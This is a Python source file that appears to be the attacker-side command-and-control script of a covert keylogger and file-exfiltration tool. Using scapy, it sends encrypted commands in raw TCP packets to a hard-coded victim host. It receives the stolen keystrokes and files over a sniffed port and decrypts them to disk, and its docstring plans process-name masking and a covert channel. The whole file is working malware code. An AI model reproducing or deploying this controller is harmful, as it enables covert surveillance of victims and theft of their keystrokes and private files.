#!/usr/bin/env python3

"""
- Create attacker/victim programs
- Mask process name
- Probably use covert channel

- Menu:
    - Start/stop keylogger
    - Transfer file from victim to attacker
    - Start/stop watching file for changes. If change, transfer to attacker
    - Start/stop watching directory. If change, transfer to attacker

"""


from scapy.all import *
from multiprocessing import Process
import sys, time
import encryption as encryption


is_running = False


def sniff_response():
    while True:
        sniff(filter="ip and tcp and host 192.168.1.65 and dst port 8500", count=1, prn=read_pkt)


def read_pkt(pkt):
    payload = pkt[Raw].load

    # Write raw (encrypted) contents to file
    with open("rawdata.txt", "ab") as file:
        file.write(payload)
    
    # If EOF marker is found, decrypt data
    if b"$EOF" in payload:
        decrypt_response()


def decrypt_response():
    with open("rawdata.txt", "rb") as file:
        data = file.read()

    # Strip EOF marker and decrypt
    data_split = data.split(b"$EOF")
    decrypted = encryption.decrypt_data(data_split[0])

    mode = data_split[1].decode("utf-8")

    filename = ""

    # Write decrypted contents to file
    if mode == "keylog":
        filename = "keylog.txt"
    
    with open(filename, "wb") as file:
        file.write(decrypted)

    # Delete raw data file after successful decryption
    os.remove("rawdata.txt")


def init_func(mode, *args):
    delimiter = "|"
    mode_encrypted = encryption.encrypt_data(mode.encode("utf-8"))
    contents = mode_encrypted.decode("utf-8") + delimiter

    # If optional args supplied (e.g., for filename), add to payload
    if args:
        encrypted_arg = encryption.encrypt_data(args[0].encode("utf-8"))
        contents += encrypted_arg.decode("utf-8") + delimiter

    pkt = IP(dst="192.168.1.65")/TCP(sport=RandShort(), dport=8505)/Raw(load=contents)

    send(pkt, verbose=False)
    time.sleep(1)


def main():
    # Initializing sniffing functionality, to receive responses from victim
    sniff_process = Process(target=sniff_response)
    sniff_process.start()

    print("Select option (e.g., 1 for keylogging). Enter 'q' to quit:\n")
    print("[1] Remote keylogging\n[2] Get file\n[3] Watch a file\n[4] Watch a directory\n[q] Quit")

    global is_running

    # Parse menu options
    while True:
        option = input("> ")

        # Remote keylogging
        if option == "1":    
            if is_running == False:
                print("[Remote keylogging] Started")
                is_running = True
                init_func("keylog")
            else:
                print("[Remote keylogging] Stopped")
                is_running = False
                init_func("keylog")
        
        # Get file
        elif option == "2":
            if is_running == False:
                print("[Get file] Started")
                is_running = True
                init_func("getfile")
            else:
                print("[Get file] Stopped")
                is_running = False
                init_func("getfile")
        
        # Watch file
        elif option == "3":
            if is_running == False:
                print("[Watch file] Started")
                is_running = True

                filename = input("Name of file to watch:\n>> ")
                init_func("watchfile", filename)
            else:
                print("[Watch file] Stopped")
                is_running = False
                init_func("watchfile")
            # break
        
        # Watch directory
        elif option == "4":
            if is_running == False:
                print("[Watch directory] Started")
                is_running = True
                init_func("watchdir")
            else:
                print("[Watch directory] Stopped")
                is_running = False
                init_func("watchdir")
            # break

        # Quit
        elif option == "q":
            print("Bye!")

            # Cleanup processes and send shutdown signal to victim
            sniff_process.terminate()
            init_func("quit")

            break

        # Invalid option
        else:
            print("Invalid option - try again (or 'q' to quit)...")
    
    sys.exit()
        

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting program...")
        sys.exit()
